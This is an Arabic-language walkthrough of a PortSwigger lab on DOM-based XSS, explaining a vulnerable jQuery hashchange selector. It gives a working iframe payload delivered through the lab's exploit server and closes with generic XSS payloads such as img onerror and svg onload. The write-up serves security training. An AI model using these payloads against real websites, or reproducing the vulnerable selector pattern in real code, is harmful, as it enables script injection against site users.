# [DOM XSS in jQuery Selector Sink Using Hashchange Event](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event)

اللاب يحتوي على ثغرة **DOM-Based XSS** في الصفحة الرئيسية. الكود يستخدم دالة jQuery `$()` selector مع قيمة يتم أخذها من `location.hash`. أي تغيير في الهاش يؤدي إلى تنفيذ الكود:

```javascript
$(window).on('hashchange', function(){
    var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
    if (post) post.get(0).scrollIntoView();
});
```

المدخل الموجود داخل:

```
window.location.hash.slice(1)
```

يتم تمريره داخل:

```
$('section.blog-list h2:contains(USER_INPUT)')
```

وبذلك يصبح الإدخال جزءًا من **jQuery selector** وهو مكان حساس جدًا، ويمكن حقنه لإغلاق الـ selector وإضافة HTML جديد يؤدي لتنفيذ JavaScript.

هدف اللاب: **جعل الضحية يقوم بتنفيذ `print()` في المتصفح.**

---

## كيفية الاستغلال

الفكرة هي إجبار الضحية على تحميل صفحة اللاب مع هاش يحتوي على payload يؤدي إلى تنفيذ HTML داخل الصفحة ثم تشغيل `print()`.

لكن بما أن الضحية لن يغيّر الهاش بنفسه، نحتاج وسيلة تجعل المتصفح يضيف payload إلى الرابط. هنا نستخدم exploit server ونضع iframe يقوم بذلك.

---

## الـ Payload المستخدم

الـ iframe التالي يقوم عند التحميل (`onload`) بإضافة الكود الخبيث إلى نهاية الـ `src`:

```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
```

### شرح البايـلود

- يبدأ iframe برابط اللاب مع هاش فارغ: `#`
    
- عند التحميل، يجري تنفيذ:
    
    ```js
    this.src += '<img src=x onerror=print()>'
    ```
    
- وبذلك يصبح الرابط:
    
    ```
    https://lab-id/.../#<img src=x onerror=print()>
    ```
    
- يتم إدخال `<img ...>` داخل jQuery selector، ما يؤدي لتنفيذ الكود.
    

---

## خطوات الحل

1. افتح الـ **Exploit Server** من اللاب.
    
2. في خانة **Body** ضع:
    
    ```html
    <iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
    ```
    
3. اضغط **Store**.
    
4. اضغط **View exploit** للتأكد من أن نافذة الطباعة تظهر.
    
5. عد إلى السيرفر واضغط **Deliver to victim**.
    
6. عند نجاح الاستغلال يتم حل اللاب.
    

---

## ملاحظات مهمة

- سبب عمل الاستغلال هو أن jQuery selector مثل:
    
    ```js
    $('h2:contains(' + INPUT + ')')
    ```
    
    يسمح بحقن محتوى HTML يؤدي لتنفيذ JavaScript.
    
- هذه الفئة من الثغرات خطيرة لأن تنفيذ الكود يجري على مستوى DOM بدون أي تعامل مع السيرفر.
    
- تغيير الهاش لا يؤدي لإعادة تحميل الصفحة، لكنه يطلق حدث `hashchange` الذي يعيد تشغيل الكود الضعيف.
    

---

## صياغة بايلودات مشابهة

يمكنك اعتماد نفس الفكرة في أي حالة يوجد فيها:

- jQuery selector يستخدم مدخل مباشر من المستخدم
    
- HTML insertion عبر innerHTML
    
- hashchange أو أي event يعتمد على input خارجي
    

### أمثلة بايلود إضافية

```html
<img src=1 onerror=alert(1)>
```

```html
<svg onload=alert(1)>
```

```html
<iframe onload=print()>
```
